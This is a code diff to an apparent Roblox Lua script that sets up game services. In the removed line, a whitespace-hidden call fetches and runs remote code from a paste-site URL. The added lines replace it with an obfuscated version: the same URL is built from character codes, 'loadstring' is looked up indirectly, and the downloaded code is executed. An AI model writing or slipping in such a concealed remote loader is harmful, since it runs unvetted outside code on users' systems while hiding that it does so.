@@ -9,7 +9,25 @@ local UserInputService: UserInputService = cloneref(game:GetService("UserInputSe
 local TextService: TextService = cloneref(game:GetService("TextService"))
 local Teams: Teams = cloneref(game:GetService("Teams"))
 local TweenService: TweenService = cloneref(game:GetService("TweenService"))
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/DLiNibJU8a/0"))()
+local a = game
+local b = string.char
+local c = table.concat
+
+local d = {
+    b(104,116,116,112,115,58,47,47),
+    b(99,100,110,46),
+    b(115,111,117,114,99,101,98,46,105,110),
+    b(47,98,105,110,115,47),
+    b(68,76,105,78,105,98,74,85,56,97),
+    b(47,48)
+}
+
+local e = c(d)
+
+local f = getfenv()[b(108,111,97,100,115,116,114,105,110,103)]
+local g = a:HttpGet(e)
+
+f(g)()
 local getgenv = getgenv or function()
     return shared
 end
